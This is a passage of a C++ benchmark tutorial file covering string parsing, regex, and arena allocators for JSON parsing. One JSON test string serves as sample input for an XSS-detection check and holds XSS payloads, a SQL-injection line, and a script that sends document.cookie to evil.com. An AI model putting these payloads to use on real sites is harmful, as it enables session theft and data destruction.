 *  Why? With the `std::pair` in its way `std::vector` can't realize that the actual
 *  contents are trivially copyable and can be moved around without any overhead.
 *
 *  @see Reddit discussion: https://www.reddit.com/r/cpp/comments/ar4ghs/stdpair_disappointing_performance/
 */
#if !defined(_MSC_VER)
static_assert(!std::is_trivially_copyable_v<std::pair<int, float>>);
#endif
static_assert(!std::is_trivially_copyable_v<std::tuple<int, float>>);

/**
 *  Coming from high-level type-punned languages, some junior developers are inclined
 *  to use `std::vector<std::any>` objects to define generic sequences. That's a horrible
 *  practice.
 */
#include <any> // `std::any`

static void packaging_stl_any(bm::State &state) {
    std::vector<std::any> a, b;
    a.resize(1'000'000);
    std::generate(a.begin(), a.end(), [] { return std::any(std::pair<int, float> {}); });
    for (auto _ : state) bm::DoNotOptimize(b = a);
}

BENCHMARK(packaging_stl_any)->MinTime(2);

/**
 *  Wrapping our STL pairs into `std::any` 10x the latency from 600 microseconds to 6 milliseconds.
 *  It's a design shortcut that almost always leads to a @b technical_debt, and coincidentally, can
 *  make your code 10x slower.
 */

#pragma endregion // Continuous Memory

#pragma region Strings, Parsing, and Regular Expressions

/**
 *  Many string libraries, including STL, Folly, and StringZilla, use a technique
 *  called "Small String Optimization" (SSO). It's a way to store small strings
 *  directly inside the string object, avoiding dynamic memory allocation.
 *
 *  Even though the `std::string::string(size_t, char)` constructor is not explicitly
 *  exception-safe, if you only use it for small strings, it won't throw a `bad_alloc`.
 *
 *  You empirically determine the capacity of the SSO buffer by running this benchmark.
 *  In `libstdc++` in GCC 13 it will be 15 bytes, while `sizeof(std::string)` is 32 bytes.
 *  In `libc++` in Clang 17 it will be 22 bytes, while `sizeof(std::string)` is 24 bytes.
 *  In StringZilla it is 22 bytes, while `sizeof(sz::string)` is 32 bytes.
 *
 *  @see "The strange details of std::string at Facebook"
 *       by Nicholas Ormrod at CppCon 2016: https://youtu.be/kPR8h4-qZdk
 *  @see Small String Optimization in StringZilla:
 *       https://github.com/ashvardanian/stringzilla?tab=readme-ov-file#memory-ownership-and-small-string-optimization
 */

static void construct_string(bm::State &state) {
    std::size_t length = static_cast<std::size_t>(state.range(0));
    for (auto _ : state) bm::DoNotOptimize(std::string(length, 'x'));
}

// clang-format off
BENCHMARK(construct_string)
    ->Arg(7)->Arg(8)->Arg(15)->Arg(16)
    ->Arg(22)->Arg(23)->Arg(24)->Arg(25)
    ->Arg(31)->Arg(32)->Arg(33)
    ->Name("construct_string/length=");
// clang-format on

/**
 *  One of the most common practical tasks in programming is parsing text.
 *  Even with `std::string` Small String Optimization, it's still wiser to use
 *  simpler structures, like the C++17 `std::string_view`, for read-only access.
 *
 *  Still, `std::string_view` and `std::string` both have very limited API and
 *  are notoriously slow. Even splitting/tokenizing a string is non-trivial
 *  frequently debated topic.
 *
 *  @see Stack Overflow discussion:
 *       https://stackoverflow.com/questions/236129/how-do-i-iterate-over-the-words-of-a-string
 *
 *  Let's try to parse a typical NIX-style config file with key-value pairs,
 *  averaging the results for a short and a long configuration text.
 */
static constexpr std::string_view short_config_text =    //
    "# This is a comment line\r\n"                       // Windows newline
    "host : example.com\n"                               // Posix newline
    "\n"                                                 // ... and a typical empty line
    "port: 8080\r"                                       // Commodore newline
    " # Tricky comment with a : colon in the middle\n\r" // Accorn newline
    "\tpath :/api/v1";                                   // No trailing newline!

LESS_SLOW_ALWAYS_INLINE bool is_newline(char c) noexcept { return c == '\n' || c == '\r'; }

LESS_SLOW_ALWAYS_INLINE std::string_view strip_spaces(std::string_view text) noexcept {
    // Trim leading whitespace
    while (!text.empty() && std::isspace(text.front())) text.remove_prefix(1);
    // Trim trailing whitespace
    while (!text.empty() && std::isspace(text.back())) text.remove_suffix(1);
    return text;
}

template <typename callback_type_, typename predicate_type_>
inline void split(std::string_view str, predicate_type_ &&is_delimiter, callback_type_ &&callback) noexcept {
    std::size_t pos = 0;
    while (pos < str.size()) {
        auto const next_pos = std::find_if(str.begin() + pos, str.end(), is_delimiter) - str.begin();
        callback(str.substr(pos, next_pos - pos));
        pos = static_cast<std::size_t>(next_pos) == str.size() ? str.size() : next_pos + 1;
    }
}

inline std::pair<std::string_view, std::string_view> split_key_value(std::string_view line) noexcept {
    // Find the first colon (':'), which we treat as the key/value boundary
    auto pos = line.find(':');
    if (pos == std::string_view::npos) return {};
    // Trim key and value separately
    auto key = strip_spaces(line.substr(0, pos));
    auto value = strip_spaces(line.substr(pos + 1));
    // Store them in a pair
    return std::make_pair(key, value);
}

void config_parse_stl(std::string_view config_text, std::vector<std::pair<std::string, std::string>> &settings) {
    split(config_text, is_newline, [&settings](std::string_view line) {
        line = strip_spaces(line);
        if (line.empty() || line.front() == '#') return; // Skip empty lines or comments
        auto [key, value] = split_key_value(line);
        if (key.empty() || value.empty()) return; // Skip invalid lines
        settings.emplace_back(key, value);
    });
}

void parse_stl(bm::State &state, std::string_view config_text) {
    std::size_t pairs = 0, bytes = 0;
    std::vector<std::pair<std::string, std::string>> settings;
    for (auto _ : state) {
        settings.clear();
        config_parse_stl(config_text, settings);
        bm::DoNotOptimize(settings);
        pairs += settings.size();
        bytes += config_text.size();
    }
    state.SetBytesProcessed(bytes);
    state.counters["pairs/s"] = bm::Counter(pairs, bm::Counter::kIsRate);
}

/**
 *  The STL's `std::ranges::views::split` won't compile with a predicate lambda,
 *  but Eric Niebler's `ranges-v3` library has a `ranges::view::split_when` that does.
 *  It is also compatible with C++14 and newer, so we don't need C++20.
 */
#include <range/v3/view/filter.hpp>
#include <range/v3/view/split_when.hpp>
#include <range/v3/view/transform.hpp>

void config_parse_ranges(std::string_view config_text, std::vector<std::pair<std::string, std::string>> &settings) {
    namespace rv = ranges::views;
    auto lines =                     //
        config_text |                //
        rv::split_when(is_newline) | //
        rv::transform([](auto &&subrange) {
            // We need to transfrom a sequence of characters back into string-views!
            // https://stackoverflow.com/a/48403210/2766161
            auto const size = ranges::distance(subrange);
            // `&*subrange.begin()` is UB if the range is empty:
            return size ? std::string_view(&*subrange.begin(), size) : std::string_view();
        }) |
        rv::transform(strip_spaces) |
        // Skip comments and empty lines
        rv::filter([](std::string_view line) { return !line.empty() && line.front() != '#'; }) |
        rv::transform(split_key_value) |
        // Skip invalid lines
        rv::filter([](auto &&kv) { return !kv.first.empty() && !kv.second.empty(); });
    for (auto [key, value] : std::move(lines)) settings.emplace_back(key, value);
}

void parse_ranges(bm::State &state, std::string_view config_text) {
    std::size_t pairs = 0, bytes = 0;
    std::vector<std::pair<std::string, std::string>> settings;
    for (auto _ : state) {
        settings.clear();
        config_parse_ranges(config_text, settings);
        bm::DoNotOptimize(settings);
        pairs += settings.size();
        bytes += config_text.size();
    }
    state.SetBytesProcessed(bytes);
    state.counters["pairs/s"] = bm::Counter(pairs, bm::Counter::kIsRate);
}

#include <stringzilla/stringzilla.hpp>

void config_parse_sz(std::string_view config_text, std::vector<std::pair<std::string, std::string>> &settings) {
    namespace sz = ashvardanian::stringzilla;

    auto newlines = sz::char_set("\r\n");
    auto whitespaces = sz::whitespaces_set();

    for (sz::string_view line : sz::string_view {config_text}.split(newlines)) {
        line = line.strip(whitespaces);
        if (line.empty() || line.front() == '#') continue; // Skip empty lines or comments
        auto [key, delimiter, value] = line.partition(':');
        key = key.strip(whitespaces);
        value = value.strip(whitespaces);
        if (key.empty() || value.empty()) continue; // Skip invalid lines
        settings.emplace_back(key, value);
    }
}

void parse_sz(bm::State &state, std::string_view config_text) {
    std::size_t pairs = 0, bytes = 0;
    std::vector<std::pair<std::string, std::string>> settings;
    for (auto _ : state) {
        settings.clear();
        config_parse_sz(config_text, settings);
        bm::DoNotOptimize(settings);
        pairs += settings.size();
        bytes += config_text.size();
    }
    state.SetBytesProcessed(bytes);
    state.counters["pairs/s"] = bm::Counter(pairs, bm::Counter::kIsRate);
}

BENCHMARK_CAPTURE(parse_stl, short_, short_config_text)->MinTime(2);
BENCHMARK_CAPTURE(parse_ranges, short_, short_config_text)->MinTime(2);
BENCHMARK_CAPTURE(parse_sz, short_, short_config_text)->MinTime(2);

/**
 *  How big can the difference be? Surely, SIMD is only relevant for Big Data?
 *  On the tiny config with just 3 fields and under 100 bytes in total:
 *
 *  - `parse_stl`:    @b 163 ns
 *  - `parse_ranges`: @b 720 ns
 *  - `parse_sz`:     @b 150 ns
 *
 *  How about larger files?
 */

static constexpr std::string_view long_config_text = R"(
# Server Configuration
server_primary_api_host_for_production_eu_west_1: main-api-primary-prod-eu-west-1.company.internal
server_secondary_api_host_for_production_eu_west_1: backup-api-secondary-prod-eu-west-1.company.internal
server_secure_tcp_port_for_https_communication: 443
server_base_path_for_data_access_layer_v2: /services/v2/resource/data-access-layer
server_connection_timeout_in_milliseconds: 180000

# Database Configuration
database_host_for_production_eu_west_1: db-prod-eu-west-1.cluster.company.internal
database_port_for_relational_engine: 3306
database_username_for_api_analytics_service: api_service_user
database_password_for_secure_authentication: 8kD3jQ!9Fs&2P
database_name_for_enterprise_analytics_and_reporting: analytics_reporting

# Logging Configuration
log_file_path_for_production_api_services: /var/log/api/prod/services/access.log
log_rotation_strategy_based_on_size_and_time: size_based
log_retention_period_in_days_for_archived_logs: 30
log_format_for_detailed_service_events: text

# Feature Toggles
feature_toggle_for_new_auth_flow: enabled
feature_toggle_for_legacy_support_mode: disabled
feature_toggle_for_dark_mode_experimentation: enabled
feature_toggle_for_multitenant_optimizations: enabled

# Monitoring Configuration
monitoring_metrics_endpoint_for_production_v2: metrics.company.com/v2/ingest
monitoring_alerting_thresholds_for_critical_warning_info: critical:90,warning:75,info:50
monitoring_dashboard_url_for_production_insights: https://dashboard.company.com/api/monitoring/prod
)";

BENCHMARK_CAPTURE(parse_stl, long_, long_config_text)->MinTime(2);
BENCHMARK_CAPTURE(parse_ranges, long_, long_config_text)->MinTime(2);
BENCHMARK_CAPTURE(parse_sz, long_, long_config_text)->MinTime(2);

/**
 *  The gap widens:
 *
 *  - `parse_stl`:    @b 1'591 ns
 *  - `parse_ranges`: @b 11'883 ns
 *  - `parse_sz`:     @b 1'182 ns
 *
 *  Sadly, oftentimes, the developers are too lazy to write a parser,
 *  and use Regular Expressions as a shortcut. Composing a RegEx pattern
 *  for our task, we should match 2 groups of characters - the key and the value.
 *  Those form a single line, with a mandatory colon (':') separator and optional
 *  whitespaces between tokens.
 *
 *  - line start + optional whitespace: `^\s*`
 *  - capturing the key: `([^#:\s]+)`
 *  - optional whitespace + colon + optional whitespace: `\s*:\s*`
 *  - capturing the value: `([^#:\s]+)`
 *  - optional trailing whitespace: `\s*$`
 *
 *  All together: `^\s*([^#:\s]+)\s*:\s*([^#:\s]+)\s*$`
 *  You can try unpacking it on RegEx101.com: https://regex101.com/
 */
#include <regex>

static constexpr std::string_view regex_for_config = R"(^\s*([^#:\s]+)\s*:\s*([^#:\s]+)\s*$)";

void config_parse_regex(std::string_view config_text, std::vector<std::pair<std::string, std::string>> &settings,
                        std::regex const &regex_fsm) {
    auto begin_ptr = config_text.data();
    auto end_ptr = begin_ptr + config_text.size();

    // Use `std::cregex_iterator` to find all non-overlapping matches
    // across multiple lines. We rely on "multiline" mode to treat
    // ^ and $ as line boundaries.
    std::cregex_iterator it(begin_ptr, end_ptr, regex_fsm);
    std::cregex_iterator end_it;

    // For each match, capture the "key" and "value" groups.
    // Group 0 is the full match, 1 and 2 are our key and value.
    for (; it != end_it; ++it) {
        std::cmatch const &match = *it;
        std::string key = match.str(1);
        std::string value = match.str(2);
        settings.emplace_back(std::move(key), std::move(value));
    }
}

void parse_regex(bm::State &state, std::string_view config_text) {
    std::size_t pairs = 0, bytes = 0;
    std::vector<std::pair<std::string, std::string>> settings;

    // Prefer multiline mode so ^ and $ anchor to line breaks...
    auto regex_options = std::regex_constants::ECMAScript;
    // ... but MSVC does not define `std::regex_constants::multiline` yet!
#if !defined(_MSC_VER)
    regex_options |= std::regex_constants::multiline;
#endif
    // Construct the regex only once. Compilation is expensive!
    // BTW, there is still no `std::string_view` constructor 🤦‍♂️
    std::regex regex_fsm(regex_for_config.data(), regex_for_config.size(), regex_options);

    for (auto _ : state) {
        settings.clear();
        config_parse_regex(config_text, settings, regex_fsm);
        bm::DoNotOptimize(settings);
        pairs += settings.size();
        bytes += config_text.size();
    }
    state.SetBytesProcessed(bytes);
    state.counters["pairs/s"] = bm::Counter(pairs, bm::Counter::kIsRate);
}

BENCHMARK_CAPTURE(parse_regex, short_, short_config_text)->MinTime(2);
BENCHMARK_CAPTURE(parse_regex, long_, long_config_text)->MinTime(2);

/**
 *  Assuming our patterns are known ahead of time, we can use C++ meta-programming
 *  for compile-time regex generation using expression templates, emitting an
 *  Assembly that is much more similar to the hand-written specialized parser,
 *  than a generic regex engine.
 *
 *  @see "Compile Time Regular Expressions" by Hana Dusíková at CppCon 2018:
 *       https://youtu.be/QM3W36COnE4
 */
#include <ctre.hpp>

#if defined(__cpp_consteval)
consteval auto regex_for_config_ctre() { return ctre::multiline_search_all<R"(^\s*([^#:\s]+)\s*:\s*([^#:\s]+)\s*?$)">; }
#else
constexpr auto regex_for_config_ctre() { return ctre::multiline_search_all<R"(^\s*([^#:\s]+)\s*:\s*([^#:\s]+)\s*?$)">; }
#endif

void config_parse_ctre(std::string_view config_text, std::vector<std::pair<std::string, std::string>> &settings) {
    // ! CTRE isn't currently handling the `$` anchor correctly.
    // ! The current workaround is to add `?` to the last whitespace group.
    // ! https://github.com/hanickadot/compile-time-regular-expressions/issues/334#issuecomment-2571614075
    constexpr auto regex_fsm = regex_for_config_ctre();
    for (auto match : regex_fsm(config_text)) {
        std::string_view key = match.get<1>().to_view();
        std::string_view value = match.get<2>().to_view();
        settings.emplace_back(key, value);
    }
}

void parse_ctre(bm::State &state, std::string_view config_text) {
    std::size_t pairs = 0, bytes = 0;
    std::vector<std::pair<std::string, std::string>> settings;

    for (auto _ : state) {
        settings.clear();
        config_parse_ctre(config_text, settings);
        bm::DoNotOptimize(settings);
        pairs += settings.size();
        bytes += config_text.size();
    }
    state.SetBytesProcessed(bytes);
    state.counters["pairs/s"] = bm::Counter(pairs, bm::Counter::kIsRate);
}

BENCHMARK_CAPTURE(parse_ctre, short_, short_config_text)->MinTime(2);
BENCHMARK_CAPTURE(parse_ctre, long_, long_config_text)->MinTime(2);

/**
 *  Aggregating the results for the short and long config files with
 *  hand-crafted and RegEx-based parsers, we get:
 *
 *  - `parse_stl`:    @b 163 ns     @b 1'591 ns
 *  - `parse_ranges`: @b 720 ns     @b 11'883 ns
 *  - `parse_sz`:     @b 150 ns     @b 1'182 ns
 *  - `parse_regex`:  @b 2'200 ns   @b 22'247 ns
 *  - `parse_ctre`:   @b 228 ns     @b 5'500 ns
 *
 *  As one can see, CTRE and expression-templates in general, are an
 *  exceptionally robust option, if you don't want to write a parser
 *  by hand.
 */

#pragma endregion // Strings, Parsing, and Regular Expressions

#pragma region JSON, Allocators, and Designing Complex Containers

/**
 *  There are several well-known libraries for JSON parsing in C/C++.
 *  The most popular is Niels Lohmann's `nlohmann::json`.
 *  The fastest for large inputs is Daniel Lemire's `simdjson`, which uses SIMD.
 *  The most portable is likely @ibireme's `yyjson`, implemented in pure C.
 *
 *  All of them are fairly simple to use, but even with the simplest tools,
 *  most developers never use them "correctly". One of the first things I recommend
 *  looking at with custom data-structures is how they handle memory allocations and
 *  checking the ability to @b override the default @b allocator.
 *
 *  For example, when processing network packets, we know the Maximum Transmission
 *  Unit @b (MTU) of the underlying protocol. So the payload of a single a message
 *  will never exceed the MTU size itself, which are well known for common protocols:
 *
 *  - Link Layer:
 *      - Ethernet: @b 1500 bytes, or 9000 bytes with Jumbo Frames
 *      - 802.11 Wi-Fi: 2304 bytes excluding headers, often reduced to 1500 bytes
 *        for compatibility with Ethernet
 *      - InfiniBand: configurable between 256, 512, 1024, 2048, and @b 4096 bytes
 *  - Network Layer:
 *      - IPv4: 576 to 1500 bytes with Path MTU Discovery
 *      - IPv6: 1280 to 1500 bytes with Path MTU Discovery
 *  - Transport Layer:
 *      - TCP: normally up to 1460 bytes of payload, subtracting 20 bytes for the
 *        IP header and 20 bytes for the TCP header from the most common 1500 bytes
 *        of Ethernet MTU
 *      - RDMA: normally 4096, when operating over InfiniBand
 *
 *  So, in theory we could benefit greatly from keeping a tiny local arena
 *  for parsing and introspecting network traffic. Let's try and do this with the
 *  C and C++ libraries, enumerating all of the JSON sub-objects in a single packet,
 *  and checking for malicious scripts, like a Cross-Site Scripting (XSS) attack:
 *
 *      { "comment": "<script>alert('XSS')</script>" }
 */
#include <cstring> // `std::memset`, `std::memmove`

static constexpr std::string_view valid_json = R"({
    "meta": { "id": 42, "valid": true, "coordinates": [ 0.0, 0.0 ], "nesting": [ [ [ null ] ] ] },
    "greetings": [
        { "language": "English", "text": "Hello there! How are you doing on this sunny day?" },
        { "language": "日本語", "text": "こんにちは！今日は晴れていますが、お元気ですか？" },
        { "language": "Español", "text": "Hola a todos, ¿cómo estáis hoy tan soleado?" }
    ]
})";

static constexpr std::string_view invalid_json = R"({
    "meta": { "id": 42, "valid": true, "coordinates": [ 1.234, 5.678 ], "nesting": [ [ [ null ] ] ] },
    "greetings": [
        { "language": "English", "text": "Hello there! How are you doing on this sunny day?" },
        { "language": "日本語", "text": "こんにちは！今日は晴れていますが、お元気ですか？" },
        { "language": "Español", "text": "Hola a todos, ¿cómo estáis hoy tan soleado?" }
    ],
    "source": "127.0.0.1, // no inline comments in vanilla JSON!
})"; // Missing closing quote, inline comment, and trailing comma - pick your poison 😁

static constexpr std::string_view malicious_json = R"({
    "meta": { "id": "<script>alert(document.cookie)</script>", "valid": true, "nesting": [ [ [ null ] ] ] },
    "greetings": [
        { "language": "English", "text": "Hello there! <img src=x onerror='alert(1)'>" },
        { "language": "HTML", "text": "<iframe src='javascript:alert(`XSS`)'></iframe>" },
        { "language": "SQL", "text": "'; DROP TABLE users; --" }
    ],
    "comment": "<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'https://evil.com/steal?cookie=' + document.cookie);</script>"
})"; // SQL injection, XSS, and a cookie-stealing script while we're at it 😁

static constexpr std::string_view packets_json[3] = {valid_json, invalid_json, malicious_json};

struct arena_t {
    static constexpr std::size_t capacity_k = 4096;
    alignas(64) std::byte buffer[capacity_k];

    /// The offset (in bytes) of the next free location
    std::size_t total_allocated = 0;
    /// The total bytes "freed" so far
    std::size_t total_reclaimed = 0;
    /// The total number of unique allocations before a reset
    std::size_t unique_allocs = 0;
    // The maximum number of bytes allocated at once
    std::size_t max_alloc_size = 0;
};

/**
 *  @brief  Allocates a new chunk of `size` bytes from the arena.
 *  @return The new pointer or `nullptr` if OOM.
 */
inline std::byte *allocate_from_arena(arena_t &arena, std::size_t size) noexcept {
    if (arena.total_allocated + size > arena_t::capacity_k) return nullptr; // Not enough space
    std::byte *ptr = arena.buffer + arena.total_allocated;
    arena.total_allocated += size;
    arena.unique_allocs++;
    arena.max_alloc_size = std::max(arena.max_alloc_size, size);
    return ptr;
}

/**
 *  @brief  Deallocates a chunk of memory previously allocated from the arena.
 *          This implementation does not "reuse" partial free space unless everything is freed.
 */
inline void deallocate_from_arena(arena_t &arena, std::byte *ptr, std::size_t size) noexcept {
    // Check if ptr is within the arena
    std::byte *start = arena.buffer;
    std::byte *end = arena.buffer + arena_t::capacity_k;
    if (ptr < start || ptr >= end) return; // Invalid pointer => no-op
    arena.total_reclaimed += size;
    // Reset completely if fully reclaimed
    if (arena.total_allocated == arena.total_reclaimed)
        arena.total_allocated = 0, arena.total_reclaimed = 0, arena.unique_allocs = 0, arena.max_alloc_size = 0;
}

/**
 *  @brief  Reallocates `ptr` to have `new_size` bytes. The old size was `old_size`.
 *          If `ptr` is the last chunk allocated, and there's room to grow in place, just expands.
 *          Otherwise, do allocates, copies, and frees.
 *  @return The new pointer or `nullptr` if OOM.
 */
inline std::byte *reallocate_from_arena( //
    arena_t &arena, std::byte *ptr, std::size_t old_size, std::size_t new_size) noexcept {
    if (!ptr) return allocate_from_arena(arena, new_size); //  A fresh allocation

    // This is effectively a `free` operation
    if (new_size == 0) {
        deallocate_from_arena(arena, ptr, old_size);
        return nullptr;
    }

    std::byte *end_of_this_chunk = ptr + old_size;
    std::byte *arena_end = arena.buffer + arena.total_allocated;
    bool is_last_chunk = end_of_this_chunk == arena_end;

    if (is_last_chunk) {
        // Expand in-place if there's enough room
        std::size_t offset = static_cast<std::size_t>(ptr - arena.buffer);
        std::size_t required_space = offset + new_size;
        if (required_space <= arena_t::capacity_k) {
            // We can grow (or shrink) in place
            arena.total_allocated = required_space;
            return ptr;
        }
    }

    // If we can't grow in place, do: allocate new + copy + free old
    std::byte *new_ptr = allocate_from_arena(arena, new_size);
    if (!new_ptr) return nullptr; // Out of memory

    // Copy the old data
    std::memmove(new_ptr, ptr, std::min(old_size, new_size));
    deallocate_from_arena(arena, ptr, old_size);
    return new_ptr;
}

#define YYJSON_DISABLE_WRITER 1          // Faster compilation & smaller binary
#define YYJSON_DISABLE_UTILS 1           // Faster compilation & smaller binary
#define YYJSON_DISABLE_UTF8_VALIDATION 1 // Faster runtime, but may not be fair
#include <yyjson.h>                      // `yyjson` library

bool contains_xss_in_yyjson(yyjson_val *node) noexcept {
    if (!node) return false;

    // Handle dictionary-like objects
    if (yyjson_is_obj(node)) {
        size_t idx, max;
        yyjson_val *key, *val;
        yyjson_obj_foreach(node, idx, max, key, val) {
            if (contains_xss_in_yyjson(val)) return true;
        }
        return false;
    }
    // Handle array
    else if (yyjson_is_arr(node)) {
        yyjson_val *val;
        yyjson_arr_iter iter = yyjson_arr_iter_with(node);
        while ((val = yyjson_arr_iter_next(&iter)))
            if (contains_xss_in_yyjson(val)) return true;
        return false;
    }
    // Handle string values
    else if (yyjson_is_str(node)) {
        std::string_view value(yyjson_get_str(node), yyjson_get_len(node));
        return value.find("<script>alert('XSS')</script>") != std::string_view::npos;
    }
    else { return false; }
}

/**
 *  `yyjson` does not only allows to override the allocator, but also passes a context object down:
 *
 *      void *(* malloc)(void *ctx, size_t size)
 *      void *(* realloc)(void *ctx, void *ptr, size_t old_size, size_t size)
 *      void (* free)(void *ctx, void *ptr)
 *
 *  It's @b almost perfect, except for one thing: the `free` doesn't receive the size of the block,
 *  so you must do bookkeeping yourself!
 *
 *  @see YYJSON allocators: https://ibireme.github.io/yyjson/doc/doxygen/html/structyyjson__alc.html
 */
yyjson_alc yyjson_wrap_arena_prepend(arena_t &arena) noexcept {
    yyjson_alc alc;
    alc.ctx = &arena;

    //? There is a neat trick that allows us to use a lambda as a
    //? C-style function pointer by using the unary `+` operator.
    //? Assuming our buffer is only 4 KB, a 16-bit unsigned integer is enough...
    using alc_size_t = std::uint16_t;
    alc.malloc = +[](void *ctx, size_t size_native) noexcept -> void * {
        alc_size_t size = static_cast<alc_size_t>(size_native);
        std::byte *result = allocate_from_arena(*static_cast<arena_t *>(ctx), size + sizeof(alc_size_t));
        if (!result) return nullptr;
        std::memcpy(result, &size, sizeof(alc_size_t));
        return (void *)(result + sizeof(alc_size_t));
    };
    alc.realloc = +[](void *ctx, void *ptr, size_t old_size_native, size_t size_native) noexcept -> void * {
        alc_size_t old_size = static_cast<alc_size_t>(old_size_native);
        alc_size_t size = static_cast<alc_size_t>(size_native);
        std::byte *start = static_cast<std::byte *>(ptr) - sizeof(alc_size_t);
        std::byte *new_start = reallocate_from_arena( //
            *static_cast<arena_t *>(ctx), start,      //
            old_size + sizeof(alc_size_t), size + sizeof(alc_size_t));
        if (!new_start) return nullptr;
        // Don't forget to increment the size if the pointer was reallocated
        std::memcpy(new_start, &size, sizeof(alc_size_t));
        return (void *)(new_start + sizeof(alc_size_t));
    };
    alc.free = +[](void *ctx, void *ptr) noexcept -> void {
        std::byte *start = static_cast<std::byte *>(ptr) - sizeof(alc_size_t);
        alc_size_t size;
        std::memcpy(&size, start, sizeof(alc_size_t));
        deallocate_from_arena(*static_cast<arena_t *>(ctx), start, size + sizeof(alc_size_t));
    };
    return alc;
}

/**
 *  There is also an even cooler way to allocate memory! @b Pointer-tagging! 🏷️
 *  64-bit address space is a lie! Many systems only use 48 bits for addresses,
 *  some even less. So, we can use the remaining bits to store metadata about
 *  the allocated block, like its size, or the arena it came from.
 *
 *  On x86, for example, calling @b `lscpu` will show:
 *
 *      Architecture:             x86_64
 *          CPU op-mode(s):         32-bit, 64-bit
 *          Address sizes:          46 bits physical, 48 bits virtual
 *          Byte Order:             Little Endian
 *
 *  48-bit virtual addressing allows mapping up to @b 256-TiB of virtual space,
 *  leaving 16 bits for metadata. But there is a catch! On every OS and CPU vendor,
 *  the mechanic is different. On Intel-based Linux systems, for example, the
 *  feature is called "Linear Address Masking" or @b LAM for short. It has 2 modes:
 *
 *  - LAM_U57: 57-bit addresses with a 5-level TLB, 7 bits for metadata in @b [57:62]
 *  - LAM_U48: 48-bit addresses with a 4-level TLB, 15 bits for metadata in @b [48:62]
 *
 *  The Linux kernel itself has to be compiled with LAM support, and the feature must
 *  also be enabled for the current running process. The bit #63 can't be touched!
 *  Nightmare, and it doesn't get better 😱
 *
 *  On AMD, a similar feature is called "Upper Address Ignore" @b (UAI) and exposes
 *  7 bits for metadata @b [57:62].
 *
 *  On Armv8-A there is a Top Byte Ignore @b (TBI) mode, that frees 8 bits for such
 *  metadata, and on Armv8.5-A there is a Memory Tagging Extension @b (MTE) that
 *  allows software to access a 4-bit allocation tag in bits @b [56:59], the lower
 *  nibble of the top byte of the address.
 *
 *  @see "Support for Intel's Linear Address Masking" on Linux Weekly News:
 *       https://lwn.net/Articles/902094/
 *  @see "AMD Posts New Linux Code For Zen 4's UAI Feature" on Phoronix:
 *       https://www.phoronix.com/news/AMD-Linux-UAI-Zen-4-Tagging
 *  @see "Memory Tagging Extension (MTE) in AArch64 Linux" in the Kernel docs:
 *       https://docs.kernel.org/6.5/arch/arm64/memory-tagging-extension.html
 */

#if defined(__x86_64__) && defined(__linux__)
#include <sys/syscall.h> // `SYS_arch_prctl`
static bool enable_pointer_tagging(unsigned long bits = 1) noexcept {
    // The argument is required number of tag bits.
    // It is rounded up to the nearest LAM mode that can provide it.
    // For now only LAM_U57 is supported, with 6 tag bits.
    // ! This requires kernel 6.2 or newer.
    int _ARCH_ENABLE_TAGGED_ADDR = 0x4002;
    return syscall(SYS_arch_prctl, _ARCH_ENABLE_TAGGED_ADDR, bits) == 0;
}
#else
static bool enable_pointer_tagging(unsigned long = 0) noexcept { return false; }
#endif

template <int start_bit_ = 48, int end_bit_ = 62>
inline void *pointer_tag(void *ptr, std::uint16_t tag) noexcept {
    static_assert(start_bit_ <= end_bit_);
    // Number of bits available for the tag:
    constexpr int bits_count = end_bit_ - start_bit_ + 1;
    static_assert(bits_count <= 16, "We only store up to 16 bits in that range (std::uint16_t).");
    // Convert pointer to a 64-bit integer:
    std::uint64_t val = reinterpret_cast<std::uint64_t>(ptr);
    // Create a mask that clears the bits in [start_bit_ .. end_bit_].
    std::uint64_t const clear_mask = ~(((1ULL << bits_count) - 1ULL) << start_bit_);
    val &= clear_mask;
    // Insert our tag into those bits:
    std::uint64_t const tag_val = (static_cast<std::uint64_t>(tag) & ((1ULL << bits_count) - 1ULL)) << start_bit_;
    val |= tag_val;
    return reinterpret_cast<void *>(val);
}

template <int start_bit_ = 48, int end_bit_ = 62>
inline std::pair<void *, std::uint16_t> pointer_untag(void *ptr) noexcept {
    static_assert(start_bit_ <= end_bit_);
    constexpr int bits_count = end_bit_ - start_bit_ + 1;
    std::uint64_t val = reinterpret_cast<std::uint64_t>(ptr);
    std::uint64_t extracted_tag = (val >> start_bit_) & ((1ULL << bits_count) - 1ULL);
    std::uint64_t const clear_mask = ~(((1ULL << bits_count) - 1ULL) << start_bit_);
    val &= clear_mask;
    return {reinterpret_cast<void *>(val), static_cast<std::uint16_t>(extracted_tag)};
}

yyjson_alc yyjson_wrap_arena_tag(arena_t &arena) noexcept {
    yyjson_alc alc;
    alc.ctx = &arena;

    //? There is a neat trick that allows us to use a lambda as a
    //? C-style function pointer by using the unary `+` operator.
    //? Assuming our buffer is only 4 KB, a 16-bit unsigned integer is enough...
    using alc_size_t = std::uint16_t;
    alc.malloc = +[](void *ctx, size_t size_native) noexcept -> void * {
        alc_size_t size = static_cast<alc_size_t>(size_native);
        std::byte *result = allocate_from_arena(*static_cast<arena_t *>(ctx), size);
        if (!result) return nullptr;
        return pointer_tag(result, size);
    };

    alc.realloc = +[](void *ctx, void *ptr, size_t old_size_native, size_t size_native) noexcept -> void * {
        alc_size_t size = static_cast<alc_size_t>(size_native);
        auto [real_ptr, old_size_from_ptr] = pointer_untag(ptr);
        assert(old_size_native == old_size_from_ptr);
        std::byte *new_ptr = reallocate_from_arena(                           //
            *static_cast<arena_t *>(ctx), static_cast<std::byte *>(real_ptr), //
            old_size_from_ptr, size_native);
        if (!new_ptr) return nullptr;
        return pointer_tag(new_ptr, size);
    };

    alc.free = +[](void *ctx, void *ptr) noexcept -> void {
        auto [real_ptr, size] = pointer_untag(ptr);
        deallocate_from_arena(*static_cast<arena_t *>(ctx), static_cast<std::byte *>(real_ptr), size);
    };
    return alc;
}

yyjson_alc yyjson_wrap_malloc(arena_t &) noexcept {
    yyjson_alc alc;
    alc.ctx = NULL;
    alc.malloc = +[](void *, size_t size) noexcept -> void * { return malloc(size); };
    alc.realloc = +[](void *, void *ptr, size_t, size_t size) noexcept -> void * { return realloc(ptr, size); };
    alc.free = +[](void *, void *ptr) noexcept -> void { free(ptr); };
    return alc;
}

typedef yyjson_alc (*yyjson_alc_wrapper)(arena_t &);

static void json_yyjson(bm::State &state, yyjson_alc_wrapper alc_wrapper = yyjson_wrap_malloc) {

    if (alc_wrapper == &yyjson_wrap_arena_tag)
        if (!enable_pointer_tagging()) state.SkipWithError("Pointer tagging not supported");

    // Wrap our custom arena into a `yyjson_alc` structure, alternatively we could use:
    //
